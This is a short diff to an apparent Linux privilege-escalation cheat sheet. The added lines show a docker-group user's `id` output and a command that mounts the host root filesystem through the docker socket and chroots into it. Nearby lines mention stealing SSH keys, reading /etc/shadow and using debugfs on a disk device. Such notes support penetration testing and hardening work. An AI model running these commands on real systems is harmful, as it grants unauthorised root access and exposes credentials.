@@ -63,6 +63,12 @@ lxc start r00t
 ```
 Docker → Effectively root
 bashdocker run -v /root:/mnt -it ubuntu
+
+ id
+uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
+
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+
 Mount any host dir → steal/add SSH keys, read /etc/shadow
 💿 Disk → Full filesystem access
 Use debugfs on /dev/sda1 → same impact as root
